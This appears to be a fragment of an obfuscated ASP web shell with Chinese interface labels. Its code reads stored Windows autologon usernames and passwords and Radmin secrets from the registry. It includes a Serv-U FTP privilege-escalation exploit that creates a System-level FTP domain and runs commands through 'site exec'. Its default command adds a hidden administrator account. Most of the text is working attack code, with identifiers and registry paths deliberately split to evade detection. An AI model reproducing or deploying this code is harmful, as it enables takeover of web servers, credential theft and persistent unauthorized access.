isAuutollogin="HKEY_LOCAL_MACHINE\SOF"&fse&"TWARE\Microsoft\Windo"&gns&"ws NT\CurrentV"&cbd&"ersion\Win"&ssd&"logon\AutoAdmi"&euy&"nLogon"
Autologin=uuf.RegRead(isAuutollogin)
azn"","用户自动登入"
if Autologin=0 or Autologin="" Then
azn"","未启用"
Else
azn"","启用"
Adminr=uuf.RegRead("HKEY_LOCAL_MACHINE\SOF"&fse&"TWARE\Microsoft\Windo"&gns&"ws NT\CurrentV"&cbd&"ersion\Win"&ssd&"logon\De"&srg&"faultUserName")
Passwd=uuf.RegRead("HKEY_LOCAL_MACHINE\SOF"&fse&"TWARE\Microsoft\Windo"&gns&"ws NT\CurrentV"&cbd&"ersion\Win"&ssd&"logon\DefaultP"&mux&"assword")
j dbi("(用户名:"&Adminr&" ，密码:"&Passwd&")")
End if
cda
err.clear:ept
end sub
function btt(sbz)
On Error Resume Next
btt=false
set dsz=khe(sbz)
If -2147221005 <> Err then btt=true
set dsz=nothing
err.clear
End function
function wic(iih)
  wic=iih
  wic=xtu(wic)
  wic=replace(wic,chr(10),"<br>")
end function
sub logout()
session.Abandon()
ysx"n",kxi,"_parent":vnz:nxh"n.submit()"
end sub
sub p()
j"<br>"
end sub
function uda(mxd)
uda="<div name='"&mxd&"' id='"&mxd&"' style=""display:none;"">www</div>"
end function
function nyd(t,n,d)
dim uvr
if d=0 then
d="none"
uvr=pel(bwy("3"))
else
d=""
uvr=dbi(bwy("4"))
end if
jkv
tez 1:azn"10' % id='ss_"&n&"",uvr
azn"","<b style='color:"&cl(13)&"'>"&t&"</b><span id='y"&n&"'></span>"
cda
bub"100%"" id='w_"&n&"' style=""display:"&d&";":tez 0:j"<td>"
end function
kgf
if eoz<>"" then
session("eoz")=eoz
end if
if session("eoz")="" then
eoz=kyv
session("eoz")=eoz
end if
if session("eoz")<>"" and right(session("eoz"),1)<>"\" then session("eoz")=session("eoz")&"\"
if oys("QUERY_STRING")=wnb then session("login")="in"
'<!
If gxj And Trim(oys("AUTH_"&igl&"USER"))="" Then
Response.Status="401 Unauthoriz"&fdy&"ed"
Response.Addheader"WWW-AuT"&rhm&"henticate","BASIC"
If oys("AUTH_"&igl&"USER")=""Then Response.End()
End If
session("login")="in"
'!>
if session("login")="" then yqn
j puu
nxh"function alc(obj){var sender=event.srcElement;var myhand='ss_'+obj.split('_')[1];if(document.getElementById(obj).style.display=='none'){document.getElementById(obj).style.display='';document.getElementById(myhand).innerHTML='"&dbi(bwy("4"))&"';sender.className='showhref';}else{document.getElementById(obj).style.display='none';document.getElementById(myhand).innerHTML='"&pel(bwy("3"))&"';sender.className='hidehref';}}"
select case dfz
'<!
case "nib":nib()
case "dcs":dcs
case "wyq":wyq
case "pex":pex
case "ksv":ksv
case "znw":znw:xey
case "ktu":ktu
case "xey":xey
case "kpn":kpn
case "bim":bim
case "bjx":bjx
case "vje":vje
case "cfv":cfv
case "omg":omg
case "ulz"
set abc=new llbf:abc.bww():set abc=nothing
case "mvv"
set abc=new llbf:abc.mvv(""):set abc=nothing
case "mdr"
set abc=new llbf:abc.mdr:set abc=nothing
case "cdn"
set abc=new llbf:abc.cdn:set abc=nothing
case "tvp"
set abc=new llbf:abc.tvp(session("eoz")):set abc=nothing
'!>
case"ybt":ybt
case "mnk":mnk
case "bxv"
set abc=new llbf:abc.bxv(session("eoz")):set abc=nothing
case "njv"
set abc=new llbf:abc.njv(session("eoz")):set abc=nothing
case "eyd":eyd
case "logout":logout
case "eye"
set abc=new llbf:abc.eye(fbn):set abc=nothing
case "iij"
set abc=new llbf:abc.iij():set abc=nothing
case "mbh"
set abc=new llbf:abc.mbh(fbn):set abc=nothing
case "csw"
set abc=new llbf:abc.csw(fbn):set abc=nothing
case "zqp"
set abc=new llbf:abc.zqp fbn,olk:set abc=nothing
case "vik"
set abc=new llbf:abc.zqp fbn,1:set abc=nothing
case "ejh"
set abc=new llbf:abc.zqp fbn,2:set abc=nothing
case "zlz"
set abc=new llbf:abc.zqp fbn,3:set abc=nothing
case "aum"
set abc=new llbf:abc.zqp fbn,4:set abc=nothing
case "swy"
set abc=new llbf:abc.swy(fbn):set abc=nothing
case "tus"
set abc=new llbf:abc.tus(fbn):set abc=nothing
case "sxu":sxu
case "pea"
set abc=new llbf:abc.pea():set abc=nothing
case "ibl"
set abc=new llbf:abc.ibl(fbn):set abc=nothing
case "rzp"
set abc=new llbf:abc.rzp():set abc=nothing
case else
zna()
end select
okv(err)
'<!
Function rza()
On Error Resume Next
dim sbz,gkz,jpi,qgm
bys
gkz=uuf.REGREAD("HKEY_LOCAL_MACHINE\SYSTEM\Ra"&cof&"dmin\v2.0\Server\Parameters\Parameter")
if err then err.clear:exit function
If IsArray(gkz) Then
For i=0 To UBound(gkz)
If  Len (hex(gkz(i)))=1 Then 
sbz=sbz & "0" & CStr(Hex(gkz(i)))
Else
sbz=sbz & Hex(gkz(i))
End If 
Next
Else
sbz="Error! Can't Read!"
End If
sbz=dbi("Parameter:")&sbz
jpi=uuf.REGREAD("HKEY_LOCAL_MACHINE\SYSTEM\Ra"&cof&"dmin\v2.0\Server\Parameters\Port")
If IsArray(jpi) Then 
qgm=Clng("&H"&CStr(Hex(jpi(1)))&CStr(Hex(jpi(0))))
Else 
qgm="Error! Can't Read!"
End If
qgm=dbi("Port:")&qgm
nyd"R"&"a"&"dm"&"in"&"&nbsp;&nbsp;&nbsp;&nbsp;"&sbz&"&nbsp;&nbsp;"&qgm,5,1
End Function
Sub omg()
On Error Resume Next
Dim rqf
rqf="Myftp"
yiq="User "&suUser&vbCrLf
smp="Pass "&suPass&vbCrLf
xlh="-DELETEDOM"&uxp&"AIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&nport&vbCrLf
mt="SITE MAIN"&dvf&"TENANCE"&vbCrLf
qed="-SetD"&mjf&"OMAIN"&vbCrLf&"-Domain="&rqf&"|0.0.0.0|"&nport&"|-1|1|0"&vbCrLf&"-TZOEn"&agc&"able=0"&vbCrLf&" TZOKey="&vbCrLf
giq="-Se"&tnd&"tUSERSetUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&nport&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
"-HomeDir="&usx()&"\\"&vbCrLf&"-LoginMes"&vgz&"File="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPa"&lyx&"ths=1"&vbCrLf&_
"-Ne"&pbc&"edSecure=0"&vbCrLf&"-HideH"&xzh&"idden=0"&vbCrLf&"-AlwaysAllowLog"&koo&"in=0"&vbCrLf&"-ChangePass"&jgb&"word=0"&vbCrLf&_
"-Qu"&vsd&"otaEnable=0"&vbCrLf&"-MaxUsersLoginPer"&pzv&"IP=-1"&vbCrLf&"-Speed"&jfs&"LimitUp=0"&vbCrLf&"-Sp"&zga&"eedLimitDown=0"&vbCrLf&_
"-Ma"&odj&"xNrUsers=-1"&vbCrLf&"-IdleTimeO"&wuz&"ut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAIN"&dvf&"TENANCE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&usx()&"\\|RWAM"&dko&"ELCDP"&vbCrLf
dfy="QUIT"&vbCrLf
lrm("Ser"&xng&"v-U FTP Exp")
Select Case fbn
Case "11"
kms
Case "22"
cvd
Case "33"
tyt
Case "44"
msa
Case "55"
qrq
Case Else
If IsObject(Session("aaa"))Then Session("aaa").abort:j"aaa"
If IsObject(Session("bbb"))Then Session("bbb").abort:j"bbb"
If IsObject(Session("ccc"))Then Session("ccc").abort:j"ccc"
set Session("aaa")=nothing
set Session("aaa")=nothing
set Session("aaa")=nothing
ysx"qgj","",""
axu"dfz","","omg"
axu"fbn","",11
j"<center><b>Add Temp Domain</b><br>"
bub "80%"
j"<hr>"
tez 1
azn 80,"Local user"
azn"",qoi("suUser","text","LocalAdministrat"&pod&"or")
azn"80m","Local pass"
azn"",qoi("suPass","text","#l@$ak#.lk;0@P")
oiz 1
azn"m"," Local port"
azn"",qoi("suPort","text","43"&cmw&"958")
azn"10%","Sys drive"
azn"40%",qoi("suPath","text",usx())
oiz 1
azn"","New user"
azn"",qoi("nuser","text","go")
azn"","New pass"
azn"",qoi("npass","text","od")
oiz 1
azn"","New port"
azn"",qoi("nport","text","60000")
azn""," "
azn"",qoi("","submit","Go")&" "&qoi("","reSet","ReSet")
cda
j"</center>"
vnz
End Select
j"<center>"
bub"80%"
j"<hr>"
tez 0
azn"c",inw("omg","","Add domain")
azn"c",inw("omg",44,"Exec cmd")
azn"c",inw("omg",55,"Clean domain")
cda
j"</center>"
j wzr
End Sub
Sub kms()
On Error Resume Next
Set aaa=khe(edg(8))
aaa.open"GET","http://127.0.0.1:"&suPort&"/goldsun/upad"&bru&"min/s1",True,"",""
aaa.send yiq&smp&mt&xlh&qed&giq&dfy
j "http://127.0.0.1:"&suPort&"/goldsun/upad"&bru&"min/s1"
j "<br>"&yiq&"<br>"&smp&"<br>"&mt&"<br>"&xlh&"<br>"&qed&"<br>"&giq&"<br>"&dfy
Set Session("aaa")=aaa
znj"Connecting 127.0.0.1:"&suPort&" using "&suUser&",pass:"&suPass&"..."
msa
End Sub
Sub cvd()
On Error Resume Next
msa()
Set bbb=khe(edg(8))
bbb.open"GET","http://"&rqd&":"&nport&"/goldsun/upad"&bru&"min/s2",False,"",""
bbb.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&suCmd&vbCrLf&dfy
Set Session("bbb")=bbb
znj"Executing yot..."
j"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
j Replace(bbb.ResponseText,chr(10),"<br>")&"</div></center>"
End Sub
Sub tyt()
On Error Resume Next
Set ccc=khe(edg(8))
ccc.open "GET","http://127.0.0.1:"&suPort&"/goldsun/upad"&bru&"min/s3",True,"",""
ccc.send yiq&smp&mt&xlh&dfy
Set Session("ccc")=ccc
znj"Temp domain deleted!"
End Sub
Function usx()
On Error Resume Next
set mvh=khe(edg(0))
usx=Lcase(Left(mvh.GetSpecialFolder(0),2))
set mvh=nothing
If usx=""Then usx="c:"
End Function
Sub msa()
If nuser=""Then nuser="go"
If npass=""Then npass="od"
If nport=""Then nport="60000"
ysx"qgj","",""
axu"dfz","","omg"
axu"fbn","",22
j"<center><b>Execute Cmd</b><br>"
bub "80%"
j"<hr>"
tez 1
azn"80m","yot"
azn"'% colspan='3",qoi("suCmd","text","cmd /c net "&krh&"user yourname$ 0ooo /add & net localgr"&ssd&"oup administrators yourname$ /add")
oiz 1
azn"m","Ftp user"
azn"40%",qoi("nuser","text",nuser)
azn"10%","Ftp pass"
azn"40%",qoi("npass","text",npass)
oiz 1
azn"","Ftp port"
azn"",qoi("nport","text",nport)
azn""," "
azn"",qoi("","submit","Go")&" "&qoi("","reSet","ReSet")
cda
j"</center>"
vnz
End Sub
Sub qrq()
ysx"qgj","",""
axu"dfz","","omg"
axu"fbn","",33
j"<center><b>Clean Temp Domain</b><br>"
bub"80%"
j"<hr>"
tez 1
azn"20%","Local user"
azn"",qoi("suUser","text","LocalAdministrat"&pod&"or")
azn"20%","Local pass"
azn"",qoi("suPass","text","#l@$ak#.lk;0@P")
oiz 1
azn"","Local port"
azn"",qoi("suPort","text","43"&cmw&"958")
azn"","Temp domain port"
azn"",qoi("nport","text","60000")
oiz 1
azn"'% align='center' colspan='4",qoi("","submit","Go")&" "&qoi("","reSet","ReSet")
cda
j"</center>"
vnz
End Sub
'!>
%>
